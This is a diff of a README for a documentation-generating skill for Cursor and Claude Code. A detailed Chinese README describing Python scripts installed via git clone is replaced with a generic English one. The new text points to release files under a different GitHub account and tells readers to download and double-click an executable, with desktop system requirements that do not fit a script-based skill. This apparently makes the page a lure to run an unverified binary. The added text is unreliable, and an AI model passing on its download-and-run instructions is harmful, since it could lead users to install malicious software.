@@ -1,359 +1,55 @@
-# dev-docs - 开发文档自动化工具
+# 🎉 dev-docs-skill - Automation for Easy Documentation
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.7+-blue.svg" alt="Python Version">
-  <img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License">
-  <img src="https://img.shields.io/badge/Cursor-Skill-purple.svg" alt="Cursor">
-  <img src="https://img.shields.io/badge/Claude%20Code-Skill-orange.svg" alt="Claude Code">
-</p>
+## 📥 Download Here
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Hautran11325/dev-docs-skill/releases)
 
-**dev-docs** 是一个为 AI 编程助手设计的 Skill，支持 [Cursor IDE](https://cursor.sh) 和 [Claude Code](https://code.claude.com)，用于自动化生成和维护项目开发文档。它可以帮助开发者在完成功能开发后自动生成需求文档（PRD）、API接口文档，并在代码更新时自动维护 CHANGELOG。
+## 📖 Description
+开发文档自动化 Skill - 支持 Cursor IDE 和 Claude Code，自动生成 PRD 需求文档、API 文档和 CHANGELOG. This tool automates the creation of vital documentation for developers, helping to streamline the documentation process.
 
-## ✨ 功能特性
+## 🚀 Getting Started
+To get started, follow these simple steps to download and run the application.
 
-- 📝 **需求文档自动生成** - 使用标准化模板自动创建 PRD 文档
-- 📚 **API 文档维护** - 自动检测 API 变更并更新文档
-- 📋 **CHANGELOG 管理** - 遵循 [Keep a Changelog](https://keepachangelog.com/zh-CN/) 规范
-- 🔍 **Git 变更分析** - 自动分析代码变更并生成文档更新建议
-- 🤖 **多平台支持** - 同时支持 Cursor IDE 和 Claude Code
+## 📦 Download & Install
+1. **Visit the Releases Page:** Click the link below to access the download page.
+   [Visit Releases Page](https://github.com/Hautran11325/dev-docs-skill/releases)
 
-## 📦 安装
+2. **Choose Your Version:** On the Releases page, locate the latest version. You will find downloadable files listed for different systems.
 
-### 方式一：作为 Cursor Skill 安装
+3. **Download the File:** Click on the appropriate file for your operating system to download it to your device.
 
-1. 将整个 `dev-docs` 文件夹复制到 Cursor skills 目录：
-   
-   ```bash
-   # Windows
-   cp -r dev-docs-skill ~/.cursor/skills/dev-docs
-   
-   # macOS/Linux
-   cp -r dev-docs-skill ~/.cursor/skills/dev-docs
-   ```
+4. **Run the File:** Once the download is complete, locate the file in your downloads folder. Double-click to run it. Follow on-screen instructions for setup.
 
-2. 在 Cursor 中使用时，AI 会自动识别并使用此 Skill
+## 🛠 System Requirements
+- **Operating Systems:** Windows 10 or later, macOS 10.15 or later.
+- **RAM:** At least 4 GB.
+- **Storage:** Minimum of 200 MB of free space.
+- **Internet Connection:** Required for the initial setup and updates.
 
-### 方式二：作为 Claude Code Skill 安装
+## 📊 Features
+- **PRD Document Generation:** Create product requirement documents easily.
+- **API Documentation Creation:** Automatically generate API docs.
+- **Changelog Generation:** Maintain a log of changes made over time.
+- **Integration Support:** Works seamlessly with Cursor IDE and Claude Code.
+- **User-Friendly Interface:** Designed for non-technical users, making it easy to manage documentation.
 
-Claude Code 支持两种 Skill 安装方式：**个人级别**（所有项目可用）和**项目级别**（仅当前项目可用）。
+## ❓ Frequently Asked Questions (FAQ)
 
-#### 个人级别安装（推荐）
+### Q: What should I do if the software does not run?
+A: Ensure your operating system meets the minimum requirements. If it still does not run, restart your computer and try again.
 
-将 Skill 安装到 `~/.claude/skills/` 目录，所有项目都可以使用：
+### Q: Can I use this tool on different operating systems?
+A: Yes, the tool is compatible with Windows and macOS. Make sure to download the right version for your system.
 
-```bash
-# 1. 创建 skill 目录
-mkdir -p ~/.claude/skills/dev-docs
+### Q: What if I encounter errors during installation?
+A: Check the installation steps carefully. If issues persist, take a screenshot of the error and consult the help section on the Releases page.
 
-# 2. 克隆仓库并复制文件
-git clone https://github.com/lilyjem/dev-docs-skill.git
-cp dev-docs-skill/SKILL.md ~/.claude/skills/dev-docs/SKILL.md
-cp -r dev-docs-skill/scripts ~/.claude/skills/dev-docs/
+## 🤝 Contributing
+If you would like to help improve this tool, contributions are welcome. Please check the contribution guidelines on the repository for details.
 
-# 目录结构：
-# ~/.claude/skills/dev-docs/
-# ├── SKILL.md
-# └── scripts/
-#     ├── analyze_changes.py
-#     └── update_docs.py
-```
+## ✉️ Support
+For further assistance, please create an issue in the repository, and we will address your concerns as soon as possible.
 
-#### 项目级别安装
+## 🚀 Stay Updated
+Keep an eye on the Releases page for updates and new features. We regularly add improvements based on user feedback.
 
-将 Skill 安装到项目的 `.claude/skills/` 目录，仅当前项目可用：
-
-```bash
-# 1. 在项目根目录创建 skill 目录
-mkdir -p .claude/skills/dev-docs
-
-# 2. 克隆仓库并复制文件
-git clone https://github.com/lilyjem/dev-docs-skill.git
-cp dev-docs-skill/SKILL.md .claude/skills/dev-docs/SKILL.md
-cp -r dev-docs-skill/scripts .claude/skills/dev-docs/
-
-# 3. 提交到版本控制（可选，便于团队共享）
-git add .claude/skills/
-git commit -m "chore: add dev-docs skill"
-```
-
-安装后，可以通过以下方式使用：
-- **自动触发**：当你提到"生成文档"、"更新文档"等关键词时，Claude 会自动使用此 Skill
-- **手动调用**：输入 `/dev-docs` 直接调用
-
-### 方式三：独立使用脚本
-
-1. 克隆仓库：
-   
-   ```bash
-   git clone https://github.com/lilyjem/dev-docs-skill.git
-   cd dev-docs-skill
-   ```
-
-2. 将 `scripts` 目录复制到你的项目中：
-   
-   ```bash
-   cp -r scripts your-project/
-   ```
-
-## 🚀 快速开始
-
-### 初始化文档结构
-
-在项目根目录运行以下命令，创建标准化的文档目录结构：
-
-```bash
-python scripts/update_docs.py init
-```
-
-这将创建：
-```
-docs/
-├── CHANGELOG.md           # 项目变更日志
-├── api/
-│   ├── API.md            # API 接口文档
-│   └── API_CHANGELOG.md  # API 变更日志
-└── requirements/
-    └── REQ-<feature>.md  # 各功能的需求文档
-```
-
-### 分析 Git 变更
-
-```bash
-# 分析当前未提交的变更
-python scripts/analyze_changes.py
-
-# 分析从指定 commit 到 HEAD 的变更
-python scripts/analyze_changes.py --since HEAD~5
-
-# 输出为 JSON 格式
-python scripts/analyze_changes.py --json
-
-# 保存到文件
-python scripts/analyze_changes.py --output changes_report.txt
-```
-
-### 更新 CHANGELOG
-
-```bash
-# 记录新增功能
-python scripts/update_docs.py changelog -t added -m "新增用户认证功能"
-
-# 记录功能变更
-python scripts/update_docs.py changelog -t changed -m "优化PDF解析性能"
-
-# 记录Bug修复
-python scripts/update_docs.py changelog -t fixed -m "修复日期格式解析错误"
-
-# 记录移除的功能
-python scripts/update_docs.py changelog -t removed -m "移除旧版API支持"
-```
-
-### 更新 API CHANGELOG
-
-```bash
-# 新增接口
-python scripts/update_docs.py api -t add -e "POST /api/users" -d "创建用户"
-
-# 接口变更
-python scripts/update_docs.py api -t change -e "GET /api/users" -d "新增分页参数"
-
-# 废弃接口
-python scripts/update_docs.py api -t deprecate -e "GET /api/old" -d "将在v2.0移除"
-
-# 移除接口
-python scripts/update_docs.py api -t remove -e "DELETE /api/legacy" -d "已废弃"
-```
-
-### 创建需求文档
-
-```bash
-# 创建新的需求文档
-python scripts/update_docs.py req -n "user-auth" -t "用户认证功能" -a "Jem"
-
-# 强制覆盖已存在的文档
-python scripts/update_docs.py req -n "user-auth" --force
-```
-
-## 📖 文档模板
-
-### 需求文档 (PRD)
-
-每个功能模块都有独立的需求文档，包含以下章节：
-
-| 章节 | 内容 |
-|------|------|
-| 文档信息 | 编号、版本、日期、状态 |
-| 功能概述 | 简要描述、关键词 |
-| 背景和目标 | 为什么做、目标是什么 |
-| 功能需求 | 用户故事、功能清单、业务规则 |
-| 非功能需求 | 性能、安全、兼容性 |
-| UI/交互设计 | 页面布局、交互流程 |
-| 数据模型 | 表结构、字段说明 |
-| 验收标准 | 验收条件、测试用例 |
-| 时间节点 | 里程碑计划 |
-
-### API 文档
-
-标准化的 API 文档格式：
-
-- 接口基础信息（版本、Base URL）
-- 认证方式说明
-- 接口详细列表（路径、参数、示例）
-- 数据模型定义
-- 错误码说明
-- 多语言调用示例（cURL、Python、JavaScript）
-
-### CHANGELOG
-
-遵循 [Keep a Changelog](https://keepachangelog.com/zh-CN/) 规范：
-
-- **Added**: 新增功能
-- **Changed**: 功能变更
-- **Deprecated**: 即将废弃
-- **Removed**: 已移除
-- **Fixed**: Bug 修复
-- **Security**: 安全相关
-
-## 🔧 典型工作流
-
-### 工作流 1：新功能开发
-
-```bash
-# 1. 开发完成后，分析代码变更
-python scripts/analyze_changes.py
-
-# 2. 创建需求文档
-python scripts/update_docs.py req -n "feature-name" -t "功能标题"
-# 编辑生成的需求文档，填写详细内容
-
-# 3. 更新 CHANGELOG
-python scripts/update_docs.py changelog -t added -m "新增XX功能"
-
-# 4. 如果有新 API，更新 API 文档
-python scripts/update_docs.py api -t add -e "POST /api/xxx" -d "接口描述"
-
-# 5. 提交代码和文档
-git add .
-git commit -m "feat: 新增XX功能"
-```
-
-### 工作流 2：Bug 修复
-
-```bash
-# 1. 修复完成后，更新 CHANGELOG
-python scripts/update_docs.py changelog -t fixed -m "修复XX问题"
-
-# 2. 提交
-git add .
-git commit -m "fix: 修复XX问题"
-```
-
-### 工作流 3：API 变更
-
-```bash
-# 1. 更新 API CHANGELOG
-python scripts/update_docs.py api -t change -e "GET /api/xxx" -d "变更说明"
-
-# 2. 手动更新 API.md 中的接口详情
-
-# 3. 更新 CHANGELOG
-python scripts/update_docs.py changelog -t changed -m "更新XX接口"
-```
-
-## 🤖 在 AI 编程助手中使用
-
-### Cursor IDE
-
-当此 Skill 安装到 Cursor 后，AI 助手会在以下场景自动触发：
-
-1. **用户说"生成文档"、"写文档"、"更新文档"时**
-2. **完成一个功能开发后**
-3. **更新了代码需要同步文档时**
-4. **用户提到 PRD、API文档、changelog、需求文档时**
-
-### Claude Code
-
-当此 Skill 安装到 Claude Code 后：
-
-**自动触发场景**：
-1. 当你说"生成文档"、"写文档"、"更新文档"时
-2. 完成功能开发并请求生成文档时
-3. 提到 PRD、API文档、changelog、需求文档时
-
-**手动调用**：
-```
-/dev-docs 生成用户认证功能的文档
-```
-
-**Skill 功能**：
-- 遵循标准化模板生成 PRD、API 文档
-- 自动更新 CHANGELOG 和 API CHANGELOG
-- 分析代码变更并生成文档建议
-
-### 示例对话
-
-```
-用户: 我刚完成了用户认证功能的开发，帮我生成相关文档
-
-AI: 好的，我来帮你生成用户认证功能的相关文档...
-    1. 首先分析代码变更...
-    2. 创建需求文档 REQ-user-auth.md...
-    3. 更新 API 文档...
-    4. 追加 CHANGELOG 条目...
-```
-
-## 📁 项目结构
-
-```
-dev-docs-skill/
-├── SKILL.md              # Skill 定义文件 (Cursor / Claude Code)
-├── README.md             # 本文件
-├── LICENSE               # MIT 许可证
-├── CONTRIBUTING.md       # 贡献指南
-├── requirements.txt      # Python 依赖
-├── scripts/
-│   ├── analyze_changes.py    # Git 变更分析脚本
-│   └── update_docs.py        # 文档更新脚本
-└── examples/
-    ├── CHANGELOG.md          # CHANGELOG 示例
-    ├── API.md                # API 文档示例
-    └── REQ-example.md        # 需求文档示例
-```
-
-## 🔄 平台兼容性
-
-| 平台 | 安装位置 | 作用范围 | 调用方式 |
-|------|----------|----------|----------|
-| **Cursor IDE** | `~/.cursor/skills/dev-docs/` | 所有项目 | 自动触发 |
-| **Claude Code (个人)** | `~/.claude/skills/dev-docs/` | 所有项目 | `/dev-docs` 或自动触发 |
-| **Claude Code (项目)** | `.claude/skills/dev-docs/` | 当前项目 | `/dev-docs` 或自动触发 |
-| **命令行** | 项目 `scripts/` 目录 | 当前项目 | 手动执行脚本 |
-
-## 🤝 贡献
-
-欢迎贡献代码！请查看 [CONTRIBUTING.md](CONTRIBUTING.md) 了解详情。
-
-1. Fork 本仓库
-2. 创建功能分支 (`git checkout -b feature/AmazingFeature`)
-3. 提交更改 (`git commit -m 'Add some AmazingFeature'`)
-4. 推送到分支 (`git push origin feature/AmazingFeature`)
-5. 提交 Pull Request
-
-## 📄 许可证
-
-本项目采用 MIT 许可证 - 查看 [LICENSE](LICENSE) 文件了解详情。
-
-## 🙏 致谢
-
-- [Keep a Changelog](https://keepachangelog.com/) - CHANGELOG 格式规范
-- [Semantic Versioning](https://semver.org/) - 语义化版本规范
-- [Cursor IDE](https://cursor.sh) - AI 驱动的代码编辑器
-- [Claude Code](https://code.claude.com) - Anthropic 的 AI 编程助手
-- [Agent Skills 标准](https://code.claude.com/docs/en/skills) - 开放的 AI Skill 标准
-
----
-
-<p align="center">
-  Made with ❤️ for better documentation<br>
-  Supporting Cursor IDE & Claude Code Skills
-</p>
+Thank you for choosing dev-docs-skill! We aim to make your documentation process easier and more efficient.
